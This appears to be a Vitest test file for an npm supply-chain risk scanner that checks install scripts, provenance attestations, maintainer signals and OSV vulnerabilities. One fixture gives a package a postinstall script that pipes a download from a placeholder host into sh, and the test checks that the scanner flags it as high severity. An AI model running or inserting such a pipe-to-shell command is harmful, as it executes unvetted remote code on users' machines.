import { describe, expect, it } from 'vitest';

import { scanTargets } from '../src/scanner.js';
import type { RegistryClient } from '../src/registry.js';
import type { ResolvedTarget } from '../src/types.js';

const target = (name: string): ResolvedTarget => ({
    name,
    version: '1.0.0',
    sources: ['explicit'],
    resolvedFrom: 'exact',
});

function registryWithScripts(scripts: Record<string, string>): RegistryClient {
    return {
        getPackument: async (name: string) => ({
            name,
            versions: { '1.0.0': { name, version: '1.0.0', scripts } },
            time: { '1.0.0': '2020-01-01T00:00:00.000Z' },
            maintainers: [],
        }),
        getWeeklyDownloads: async () => 42,
        getAttestations: async () => ({ attested: false }),
    };
}

describe('scanTargets install-script slice', () => {
    it('emits a scanned row with install-script findings', async () => {
        const [item] = await scanTargets([target('dangerous')], {
            registry: registryWithScripts({ postinstall: 'curl https://example.test/bin | sh' }),
            checks: ['installScripts'],
            now: () => new Date('2026-07-13T00:00:00.000Z'),
            score: () => 35,
        });
        expect(item).toMatchObject({
            status: 'scanned',
            package: 'dangerous',
            version: '1.0.0',
            riskScore: 35,
            riskLevel: 'medium',
            findingCount: 1,
            findings: [{ check: 'installScripts', severity: 'high' }],
            provenance: { attested: false },
            meta: { weeklyDownloads: 42 },
            scannedAt: '2026-07-13T00:00:00.000Z',
        });
    });

    it('joins multiple source labels for the dataset overview', async () => {
        const [item] = await scanTargets([{
            ...target('combined'),
            sources: ['explicit', 'manifest'],
        }], {
            registry: registryWithScripts({}),
            checks: ['installScripts'],
            now: () => new Date('2026-07-13T00:00:00.000Z'),
        });
        expect(item).toMatchObject({
            sources: ['explicit', 'manifest'],
            sourcesText: 'explicit, manifest',
        });
    });

    it('emits an error row when required package metadata fails', async () => {
        const registry = {
            ...registryWithScripts({}),
            getPackument: async () => { throw new Error('registry timeout'); },
        };
        const [item] = await scanTargets([target('unavailable')], {
            registry,
            checks: ['installScripts'],
            now: () => new Date('2026-07-13T00:00:00.000Z'),
            score: () => 0,
        });
        expect(item).toEqual({
            status: 'error',
            package: 'unavailable',
            version: '1.0.0',
            sources: ['explicit'],
            sourcesText: 'explicit',
            resolvedFrom: 'exact',
            error: { code: 'REGISTRY_ERROR', message: 'registry timeout' },
            scannedAt: '2026-07-13T00:00:00.000Z',
        });
    });

    it('does not fetch or score provenance when the check is disabled', async () => {
        const registry = registryWithScripts({ postinstall: 'node install.js' });
        registry.getAttestations = async () => { throw new Error('attestation service unavailable'); };
        const [item] = await scanTargets([target('install-only')], {
            registry,
            checks: ['installScripts'],
            now: () => new Date('2026-07-13T00:00:00.000Z'),
        });
        expect(item).toMatchObject({
            status: 'scanned',
            riskScore: 15,
            provenance: { attested: false },
            findings: [{ check: 'installScripts', severity: 'medium' }],
        });
    });

    it('bounds package concurrency at five', async () => {
        let active = 0;
        let maximum = 0;
        const registry = {
            ...registryWithScripts({}),
            getPackument: async (name: string) => {
                active += 1;
                maximum = Math.max(maximum, active);
                await new Promise((resolve) => setTimeout(resolve, 2));
                active -= 1;
                return registryWithScripts({}).getPackument(name);
            },
        };
        await scanTargets(Array.from({ length: 12 }, (_, index) => target(`pkg-${index}`)), {
            registry,
            checks: ['installScripts'],
            now: () => new Date('2026-07-13T00:00:00.000Z'),
            score: () => 0,
        });
        expect(maximum).toBe(5);
    });

    it('dispatches selected provenance and maintainer checks', async () => {
        const registry = registryWithScripts({});
        const [item] = await scanTargets([target('unattested')], {
            registry,
            checks: ['provenance', 'maintainerSignals'],
            now: () => new Date('2026-07-13T00:00:00.000Z'),
            score: (findings) => findings.length * 5,
        });
        expect(item?.status).toBe('scanned');
        if (item?.status === 'scanned') {
            expect(item.findings).toContainEqual(expect.objectContaining({ check: 'provenance', severity: 'low' }));
            expect(item.findings.every(({ check }) => check !== 'installScripts')).toBe(true);
        }
    });

    it('uses exact-version dist attestations without calling the attestation endpoint', async () => {
        const registry = registryWithScripts({});
        registry.getPackument = async (name: string) => ({
            name,
            versions: { '1.0.0': { name, version: '1.0.0', dist: { attestations: { url: 'https://registry.example/attestation' } } } },
        });
        registry.getAttestations = async () => { throw new Error('endpoint should not be called'); };
        const [item] = await scanTargets([target('attested')], {
            registry,
            checks: ['provenance'],
            now: () => new Date('2026-07-13T00:00:00.000Z'),
        });
        expect(item).toMatchObject({ status: 'scanned', provenance: { attested: true }, riskScore: 0 });
    });

    it('does not report legacy registry signatures as provenance', async () => {
        const registry = registryWithScripts({});
        registry.getPackument = async (name: string) => ({
            name,
            versions: { '1.0.0': { name, version: '1.0.0', dist: { signatures: [{ keyid: 'legacy' }] } } },
        });
        const [item] = await scanTargets([target('signed-only')], {
            registry,
            checks: ['provenance'],
            now: () => new Date('2026-07-13T00:00:00.000Z'),
        });
        expect(item).toMatchObject({ status: 'scanned', provenance: { attested: false }, riskScore: 5 });
    });

    it('maps prefetched OSV results through the pure check', async () => {
        const [item] = await scanTargets([target('vulnerable')], {
            registry: registryWithScripts({}),
            checks: ['osvVulns'],
            osvVulnerabilities: new Map([['vulnerable@1.0.0', [{ id: 'OSV-1', severity: [{ type: 'CVSS_V3', score: '8.0' }] }]]]),
            now: () => new Date('2026-07-13T00:00:00.000Z'),
            score: () => 35,
        });
        expect(item?.status === 'scanned' ? item.findings : []).toContainEqual(
            expect.objectContaining({ check: 'osvVulns', severity: 'high' }),
        );
    });
});
